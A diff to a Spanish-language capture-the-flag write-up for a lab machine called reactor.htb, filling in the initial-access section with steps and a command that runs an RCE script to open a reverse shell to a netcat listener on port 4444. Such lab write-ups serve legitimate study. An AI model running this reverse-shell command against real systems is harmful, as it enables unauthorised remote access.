@@ -45,13 +45,13 @@ status: ""
 ## 3. Exploitation (Acceso Inicial)
 
 ### Metodología
-1. 
-2. 
-3. 
+1. Intentamos ejecutar un script para explotar la vulnerabilidad RCE
+2. Colocamos un puerto en escucha en `4444` con netcat para ver que sucede
+3. Intentamos ejecutar comandos de terminal justamente ejecutando el script
 
 ### Ejecución
 ```bash
-
+node react2shell.js http://reactor.htb:3000 shell 10.10.14.5 4444
 ```
 
 **Prueba de acceso (User Flag):**
